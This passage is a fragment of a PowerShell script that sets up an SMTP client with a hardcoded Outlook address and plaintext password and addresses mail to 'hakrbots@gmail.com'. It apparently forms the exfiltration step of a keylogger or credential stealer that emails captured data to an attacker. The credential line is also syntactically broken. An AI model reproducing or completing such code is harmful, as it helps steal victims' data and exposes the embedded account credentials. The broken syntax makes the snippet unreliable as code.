...
$smtp.Credentials = New-Object System.Net.NetworkCredential("oxdom123@outlook.com, "pleasedonthackme@123");
$smtp.EnableSsl = $true
$Message.From = "oxdom123@outlook.com"
$Message.To.Add("hakrbots@gmail.com")
